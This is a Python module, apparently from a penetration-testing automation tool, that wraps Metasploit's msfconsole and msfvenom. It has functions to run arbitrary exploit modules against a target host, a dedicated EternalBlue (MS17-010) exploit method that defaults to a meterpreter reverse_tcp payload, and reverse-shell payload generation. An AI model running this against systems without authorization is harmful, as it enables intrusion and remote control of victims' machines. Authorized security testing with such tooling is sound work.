"""
Metasploit Framework Module
"""
import re
import json
from typing import Dict, Any, List
from .base_tool import BaseTool
from loguru import logger


class MetasploitFramework(BaseTool):
    """Metasploit Framework wrapper"""
    
    def get_default_command(self) -> str:
        return "msfconsole"
    
    def get_install_command(self, platform: str, package_manager: str) -> str:
        """Get platform-specific installation command for Metasploit"""
        # Metasploit has special installation procedures
        if platform == "linux":
            if package_manager in ["apt", "apt-get"]:
                # Debian/Ubuntu - use official installer
                return "curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall"
            elif package_manager in ["yum", "dnf"]:
                # RHEL/CentOS/Fedora
                return "curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall"
            elif package_manager == "pacman":
                return "metasploit"  # Available in AUR
        elif platform == "darwin":
            return "metasploit"  # Homebrew cask
        elif platform == "windows":
            # Windows requires manual installer download
            return None
        
        return None
    
    def parse_output(self, output: str) -> Dict[str, Any]:
        """Parse metasploit output"""
        results = {
            "sessions": [],
            "exploited": False,
            "modules_used": [],
            "raw_output": output
        }
        
        # Parse sessions
        session_pattern = r"session (\d+) opened"
        sessions = re.findall(session_pattern, output, re.IGNORECASE)
        results["sessions"] = [int(s) for s in sessions]
        results["exploited"] = len(sessions) > 0
        
        # Parse used modules
        module_pattern = r"use (exploit|auxiliary|post)/(.+)"
        modules = re.findall(module_pattern, output)
        results["modules_used"] = [f"{m[0]}/{m[1]}" for m in modules]
        
        return results
    
    def search_exploits(self, query: str) -> Dict[str, Any]:
        """Search for exploits"""
        logger.info(f"Searching exploits for: {query}")
        command = f"search {query}; exit"
        return self.execute(["-q", "-x", command])
    
    def run_exploit(self, exploit_path: str, target: str, payload: str = None, 
                   options: Dict[str, str] = None) -> Dict[str, Any]:
        """Run an exploit"""
        logger.info(f"Running exploit {exploit_path} against {target}")
        
        commands = [
            f"use {exploit_path}",
            f"set RHOSTS {target}"
        ]
        
        if payload:
            commands.append(f"set PAYLOAD {payload}")
        
        if options:
            for key, value in options.items():
                commands.append(f"set {key} {value}")
        
        commands.extend(["exploit", "exit"])
        command_string = "; ".join(commands)
        
        return self.execute(["-q", "-x", command_string])
    
    def run_auxiliary(self, module_path: str, target: str, 
                     options: Dict[str, str] = None) -> Dict[str, Any]:
        """Run an auxiliary module"""
        logger.info(f"Running auxiliary module {module_path} against {target}")
        
        commands = [
            f"use {module_path}",
            f"set RHOSTS {target}"
        ]
        
        if options:
            for key, value in options.items():
                commands.append(f"set {key} {value}")
        
        commands.extend(["run", "exit"])
        command_string = "; ".join(commands)
        
        return self.execute(["-q", "-x", command_string])
    
    def exploit_eternalblue(self, target: str, payload: str = "windows/x64/meterpreter/reverse_tcp",
                           lhost: str = None, lport: int = 4444) -> Dict[str, Any]:
        """Exploit EternalBlue vulnerability (MS17-010)"""
        logger.info(f"Attempting EternalBlue exploit against {target}")
        
        options = {
            "PAYLOAD": payload,
            "LPORT": str(lport)
        }
        
        if lhost:
            options["LHOST"] = lhost
        
        return self.run_exploit("exploit/windows/smb/ms17_010_eternalblue", target, 
                               payload=payload, options=options)
    
    def check_vulnerability(self, target: str, check_module: str) -> Dict[str, Any]:
        """Check if target is vulnerable using auxiliary module"""
        logger.info(f"Checking vulnerability {check_module} on {target}")
        
        commands = [
            f"use {check_module}",
            f"set RHOSTS {target}",
            "check",
            "exit"
        ]
        
        command_string = "; ".join(commands)
        return self.execute(["-q", "-x", command_string])


class MSFVenom(BaseTool):
    """MSFVenom payload generator"""
    
    def get_default_command(self) -> str:
        return "msfvenom"
    
    def parse_output(self, output: str) -> Dict[str, Any]:
        """Parse msfvenom output"""
        return {
            "payload_generated": "Payload size" in output,
            "raw_output": output
        }
    
    def generate_payload(self, payload: str, lhost: str, lport: int, 
                        format: str = "elf", output_file: str = None) -> Dict[str, Any]:
        """Generate payload"""
        logger.info(f"Generating {payload} payload for {lhost}:{lport}")
        
        args = [
            "-p", payload,
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f", format
        ]
        
        if output_file:
            args.extend(["-o", output_file])
        
        return self.execute(args)
